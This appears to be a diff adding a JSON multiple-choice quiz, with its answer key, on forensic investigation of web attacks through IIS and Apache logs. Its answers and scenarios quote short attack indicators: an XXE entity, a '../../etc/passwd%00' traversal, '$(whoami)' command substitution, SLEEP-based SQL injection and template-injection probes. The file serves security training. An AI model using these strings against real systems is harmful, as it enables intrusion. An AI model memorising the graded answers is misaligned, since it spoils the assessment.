+        "isCorrect": false
+      },
+      {
+        "value": "<!ENTITY xxe SYSTEM \"http://internal-server:8080/admin\">",
+        "isCorrect": true
+      },
+      {
+        "value": "<!ENTITY xxe \"test\">",
+        "isCorrect": false
+      },
+      {
+        "value": "<!ENTITY xxe PUBLIC \"test\" \"test\">",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "What does the HTTP status code 413 in web server logs indicate during a forensic investigation?",
+    "options": [
+      {
+        "value": "Unauthorized access attempt",
+        "isCorrect": false
+      },
+      {
+        "value": "Request entity too large - potentially indicating file upload attack or buffer overflow attempt",
+        "isCorrect": true
+      },
+      {
+        "value": "Resource not found",
+        "isCorrect": false
+      },
+      {
+        "value": "Server timeout",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "When analyzing web logs for command injection, which character sequences should be prioritized in the search?",
+    "options": [
+      {
+        "value": "< > and \"",
+        "isCorrect": false
+      },
+      {
+        "value": "; | & ` $( and backticks",
+        "isCorrect": true
+      },
+      {
+        "value": "= and ==",
+        "isCorrect": false
+      },
+      {
+        "value": "// and /* */",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Case Scenario: A web server log shows repeated requests to /wp-admin/admin-ajax.php with various payloads in the 'action' parameter. The User-Agent indicates 'WPScan'. What type of activity is this?",
+    "options": [
+      {
+        "value": "Normal WordPress administration",
+        "isCorrect": false
+      },
+      {
+        "value": "Automated WordPress vulnerability scanning",
+        "isCorrect": true
+      },
+      {
+        "value": "Database backup operation",
+        "isCorrect": false
+      },
+      {
+        "value": "WordPress theme installation",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "In IIS log forensics, what does the sc-substatus field provide that sc-status alone does not?",
+    "options": [
+      {
+        "value": "The source IP address",
+        "isCorrect": false
+      },
+      {
+        "value": "More granular error information, such as specific authentication failure reasons",
+        "isCorrect": true
+      },
+      {
+        "value": "The request method",
+        "isCorrect": false
+      },
+      {
+        "value": "The response body content",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Which log entry pattern would indicate a potential NULL byte injection attempt in a path traversal attack?",
+    "options": [
+      {
+        "value": "/image.php?file=photo.jpg",
+        "isCorrect": false
+      },
+      {
+        "value": "/download.php?file=../../etc/passwd%00.jpg",
+        "isCorrect": true
+      },
+      {
+        "value": "/gallery.php?id=123",
+        "isCorrect": false
+      },
+      {
+        "value": "/search.php?q=test",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "What is the PRIMARY purpose of examining the Referer header in web attack forensics?",
+    "options": [
+      {
+        "value": "To identify the client's operating system",
+        "isCorrect": false
+      },
+      {
+        "value": "To trace the attack path and identify phishing pages or malicious referral sources",
+        "isCorrect": true
+      },
+      {
+        "value": "To determine the server's hostname",
+        "isCorrect": false
+      },
+      {
+        "value": "To calculate response time",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Case Scenario: Investigation reveals that an attacker successfully exfiltrated data using DNS queries containing encoded data (e.g., 'base64data.attacker.com'). This technique was used after exploiting an XXE vulnerability. What is this technique called?",
+    "options": [
+      {
+        "value": "DNS poisoning",
+        "isCorrect": false
+      },
+      {
+        "value": "DNS tunneling or Out-of-Band data exfiltration via DNS",
+        "isCorrect": true
+      },
+      {
+        "value": "DNS amplification",
+        "isCorrect": false
+      },
+      {
+        "value": "DNS cache snooping",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Which Apache module would need to be enabled to log request body content (POST data) for forensic analysis?",
+    "options": [
+      {
+        "value": "mod_ssl",
+        "isCorrect": false
+      },
+      {
+        "value": "mod_security or mod_dumpio",
+        "isCorrect": true
+      },
+      {
+        "value": "mod_rewrite",
+        "isCorrect": false
+      },
+      {
+        "value": "mod_proxy",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "When analyzing brute force attack patterns in web logs, which metric would be MOST useful for identifying the attack threshold?",
+    "options": [
+      {
+        "value": "Total bandwidth consumed",
+        "isCorrect": false
+      },
+      {
+        "value": "Number of failed authentication attempts per IP per time unit",
+        "isCorrect": true
+      },
+      {
+        "value": "Average response time",
+        "isCorrect": false
+      },
+      {
+        "value": "Number of unique User-Agents",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "What forensic evidence might indicate that an attacker used Burp Suite during a web attack?",
+    "options": [
+      {
+        "value": "Requests from mobile devices only",
+        "isCorrect": false
+      },
+      {
+        "value": "User-Agent containing 'Burp' or sequential requests with systematic parameter fuzzing",
+        "isCorrect": true
+      },
+      {
+        "value": "Only GET requests were made",
+        "isCorrect": false
+      },
+      {
+        "value": "All requests had identical timestamps",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "In the context of web attack investigation, what does finding 'etc/passwd' or 'windows/system32' in decoded log entries primarily indicate?",
+    "options": [
+      {
+        "value": "Normal system file access",
+        "isCorrect": false
+      },
+      {
+        "value": "Path traversal or Local File Inclusion attack attempts",
+        "isCorrect": true
+      },
+      {
+        "value": "System backup operations",
+        "isCorrect": false
+      },
+      {
+        "value": "Legitimate administrative access",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "What is the significance of the 'Win32 status' field (sc-win32-status) in IIS logs during security investigations?",
+    "options": [
+      {
+        "value": "It shows the Windows license status",
+        "isCorrect": false
+      },
+      {
+        "value": "It provides Windows system error codes that can reveal authentication failures or access denials",
+        "isCorrect": true
+      },
+      {
+        "value": "It indicates the Windows version number",
+        "isCorrect": false
+      },
+      {
+        "value": "It shows the process ID of the request handler",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Case Scenario: During a web attack investigation, you notice that the attacker's requests include 'X-Forwarded-For' headers with IP addresses different from the actual source IP. What does this suggest?",
+    "options": [
+      {
+        "value": "The web server is configured incorrectly",
+        "isCorrect": false
+      },
+      {
+        "value": "The attacker is using a proxy or attempting to spoof their IP address",
+        "isCorrect": true
+      },
+      {
+        "value": "The firewall is blocking the original IP",
+        "isCorrect": false
+      },
+      {
+        "value": "The logs are corrupted",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Which OWASP Top 10 2021 category specifically addresses vulnerabilities related to deserializing untrusted data?",
+    "options": [
+      {
+        "value": "A03:2021 - Injection",
+        "isCorrect": false
+      },
+      {
+        "value": "A08:2021 - Software and Data Integrity Failures",
+        "isCorrect": true
+      },
+      {
+        "value": "A05:2021 - Security Misconfiguration",
+        "isCorrect": false
+      },
+      {
+        "value": "A01:2021 - Broken Access Control",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "When analyzing web logs for Second-Order SQL Injection, what characteristic differentiates it from traditional SQL injection?",
+    "options": [
+      {
+        "value": "It only works with MySQL databases",
+        "isCorrect": false
+      },
+      {
+        "value": "The malicious payload is stored first and executed later when retrieved from the database",
+        "isCorrect": true
+      },
+      {
+        "value": "It requires physical access to the server",
+        "isCorrect": false
+      },
+      {
+        "value": "It only affects NoSQL databases",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "In web attack investigation methodology, what is the FIRST step after identifying a potential security incident?",
+    "options": [
+      {
+        "value": "Immediately patch the vulnerability",
+        "isCorrect": false
+      },
+      {
+        "value": "Preserve and collect evidence including logs and system snapshots",
+        "isCorrect": true
+      },
+      {
+        "value": "Notify the media",
+        "isCorrect": false
+      },
+      {
+        "value": "Restore from backup",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Case Scenario: A forensic analyst finds the following entry in Apache logs: 'POST /api/users HTTP/1.1' with a response size significantly larger than normal. Combined with SQL keywords in the request body, what might this indicate?",
+    "options": [
+      {
+        "value": "Normal API usage",
+        "isCorrect": false
+      },
+      {
+        "value": "Successful SQL injection that dumped database records in the response",
+        "isCorrect": true
+      },
+      {
+        "value": "File upload operation",
+        "isCorrect": false
+      },
+      {
+        "value": "Authentication request",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Which tool can be used to perform offline analysis of IIS log files and supports SQL-like query syntax?",
+    "options": [
+      {
+        "value": "Wireshark",
+        "isCorrect": false
+      },
+      {
+        "value": "Microsoft Log Parser",
+        "isCorrect": true
+      },
+      {
+        "value": "Nessus",
+        "isCorrect": false
+      },
+      {
+        "value": "Nikto",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "What is a key forensic indicator of a successful Blind SQL Injection attack in web server logs?",
+    "options": [
+      {
+        "value": "Error messages in the response",
+        "isCorrect": false
+      },
+      {
+        "value": "Multiple similar requests with slight variations and consistent response codes",
+        "isCorrect": true
+      },
+      {
+        "value": "Large file uploads",
+        "isCorrect": false
+      },
+      {
+        "value": "Redirect responses only",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "During analysis of a suspected XSS attack, which evidence source would be LEAST useful for forensic investigation?",
+    "options": [
+      {
+        "value": "Web server access logs",
+        "isCorrect": false
+      },
+      {
+        "value": "WAF logs",
+        "isCorrect": false
+      },
+      {
+        "value": "Database transaction logs",
+        "isCorrect": true
+      },
+      {
+        "value": "Browser history of affected users",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Case Scenario: An attacker successfully executed commands on a web server. The logs show requests containing '$(whoami)' and '`id`' in URL parameters. What type of command injection technique was used?",
+    "options": [
+      {
+        "value": "Semicolon-based command chaining",
+        "isCorrect": false
+      },
+      {
+        "value": "Command substitution using backticks and $() syntax",
+        "isCorrect": true
+      },
+      {
+        "value": "Pipe-based output redirection",
+        "isCorrect": false
+      },
+      {
+        "value": "Background process execution",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "What does finding 'SLEEP(5)' or 'BENCHMARK()' functions in web request logs suggest?",
+    "options": [
+      {
+        "value": "Performance testing by developers",
+        "isCorrect": false
+      },
+      {
+        "value": "Time-based Blind SQL Injection attack attempts",
+        "isCorrect": true
+      },
+      {
+        "value": "Server maintenance operations",
+        "isCorrect": false
+      },
+      {
+        "value": "Database optimization queries",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Which IIS log field combination would be MOST valuable for identifying potential data exfiltration through web requests?",
+    "options": [
+      {
+        "value": "date and time only",
+        "isCorrect": false
+      },
+      {
+        "value": "cs-uri-query and sc-bytes combined with cs-method",
+        "isCorrect": true
+      },
+      {
+        "value": "cs-host only",
+        "isCorrect": false
+      },
+      {
+        "value": "sc-status only",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "In the context of investigating web attacks, what is the significance of 'polyglot' payloads?",
+    "options": [
+      {
+        "value": "They only work in one specific browser",
+        "isCorrect": false
+      },
+      {
+        "value": "They are designed to work as valid syntax in multiple contexts (e.g., both XSS and SQL injection)",
+        "isCorrect": true
+      },
+      {
+        "value": "They require multiple attackers to execute",
+        "isCorrect": false
+      },
+      {
+        "value": "They are legitimate testing tools",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Case Scenario: Web logs reveal that an attacker made requests to '/admin' with response code 403, then accessed '/admin/' with response code 200. What vulnerability was likely exploited?",
+    "options": [
+      {
+        "value": "SQL Injection",
+        "isCorrect": false
+      },
+      {
+        "value": "Path normalization or trailing slash bypass",
+        "isCorrect": true
+      },
+      {
+        "value": "XSS attack",
+        "isCorrect": false
+      },
+      {
+        "value": "Buffer overflow",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Which Apache log directive would capture the SSL/TLS protocol version used by clients, which may be relevant for security investigations?",
+    "options": [
+      {
+        "value": "%h",
+        "isCorrect": false
+      },
+      {
+        "value": "%{SSL_PROTOCOL}x",
+        "isCorrect": true
+      },
+      {
+        "value": "%r",
+        "isCorrect": false
+      },
+      {
+        "value": "%b",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "What is the forensic significance of finding repeated requests to 'robots.txt' and 'sitemap.xml' before a web attack?",
+    "options": [
+      {
+        "value": "These are normal SEO operations",
+        "isCorrect": false
+      },
+      {
+        "value": "The attacker was performing reconnaissance to discover hidden directories and endpoints",
+        "isCorrect": true
+      },
+      {
+        "value": "The web server was misconfigured",
+        "isCorrect": false
+      },
+      {
+        "value": "The CDN was caching incorrectly",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Case Scenario: A web application was compromised via a file upload vulnerability. The attacker uploaded a PHP file disguised as an image. Which log artifact would help identify the exact payload?",
+    "options": [
+      {
+        "value": "The Referer header",
+        "isCorrect": false
+      },
+      {
+        "value": "The request body content in WAF logs or custom request logging",
+        "isCorrect": true
+      },
+      {
+        "value": "The sc-status field",
+        "isCorrect": false
+      },
+      {
+        "value": "The User-Agent string",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "In OWASP Top 10 2021, which category specifically addresses insufficient logging and monitoring?",
+    "options": [
+      {
+        "value": "A05:2021 - Security Misconfiguration",
+        "isCorrect": false
+      },
+      {
+        "value": "A09:2021 - Security Logging and Monitoring Failures",
+        "isCorrect": true
+      },
+      {
+        "value": "A07:2021 - Identification and Authentication Failures",
+        "isCorrect": false
+      },
+      {
+        "value": "A10:2021 - Server-Side Request Forgery",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Which of the following would indicate a successful Insecure Direct Object Reference (IDOR) attack in web logs?",
+    "options": [
+      {
+        "value": "Requests with XSS payloads",
+        "isCorrect": false
+      },
+      {
+        "value": "Sequential access to resources with incrementing IDs returning 200 status codes",
+        "isCorrect": true
+      },
+      {
+        "value": "Failed login attempts",
+        "isCorrect": false
+      },
+      {
+        "value": "Requests to static files only",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Case Scenario: An analyst discovers that web server logs show requests with HTTP method 'DEBUG' to an ASP.NET application. What security concern does this raise?",
+    "options": [
+      {
+        "value": "No security concern, DEBUG is a standard HTTP method",
+        "isCorrect": false
+      },
+      {
+        "value": "DEBUG method may allow execution of arbitrary code if debugging is enabled",
+        "isCorrect": true
+      },
+      {
+        "value": "DEBUG only affects database connections",
+        "isCorrect": false
+      },
+      {
+        "value": "DEBUG requests are always blocked by IIS",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "When investigating a Cross-Site Request Forgery (CSRF) attack, which log field would be MOST valuable for determining if proper protections were bypassed?",
+    "options": [
+      {
+        "value": "The response size",
+        "isCorrect": false
+      },
+      {
+        "value": "The Referer/Origin headers and presence of CSRF tokens in requests",
+        "isCorrect": true
+      },
+      {
+        "value": "The client IP address",
+        "isCorrect": false
+      },
+      {
+        "value": "The User-Agent string",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "What does an HTTP status code of 431 in web server logs indicate?",
+    "options": [
+      {
+        "value": "Server timeout",
+        "isCorrect": false
+      },
+      {
+        "value": "Request header fields too large - potentially indicating header injection attack",
+        "isCorrect": true
+      },
+      {
+        "value": "Resource not found",
+        "isCorrect": false
+      },
+      {
+        "value": "Authentication required",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Case Scenario: Investigation of a web attack reveals the following payload in logs: '{{7*7}}' and '${7*7}'. The attacker received '49' in the response. What type of vulnerability was exploited?",
+    "options": [
+      {
+        "value": "SQL Injection",
+        "isCorrect": false
+      },
+      {
+        "value": "Server-Side Template Injection (SSTI)",
+        "isCorrect": true
+      },
+      {
+        "value": "Cross-Site Scripting",
+        "isCorrect": false
+      },
+      {
+        "value": "Local File Inclusion",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Which characteristic distinguishes HTTP Parameter Pollution (HPP) attacks in web logs?",
+    "options": [
+      {
+        "value": "Large payload sizes",
+        "isCorrect": false
+      },
+      {
+        "value": "The same parameter appearing multiple times with different values in a single request",
+        "isCorrect": true
+      },
+      {
+        "value": "Only POST requests are affected",
+        "isCorrect": false
+      },
+      {
+        "value": "Requests always result in 500 errors",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "When analyzing Apache error logs, what does 'ModSecurity: Warning. Matched \"Operator `Rx' with parameter' indicate?",
+    "options": [
+      {
+        "value": "A system crash occurred",
+        "isCorrect": false
+      },
+      {
+        "value": "A WAF rule pattern match was triggered, indicating a potential attack attempt",
+        "isCorrect": true
+      },
+      {
+        "value": "The server is running low on memory",
+        "isCorrect": false
+      },
+      {
+        "value": "An SSL certificate error",
+        "isCorrect": false
+      }
+    ]
+  }
+]
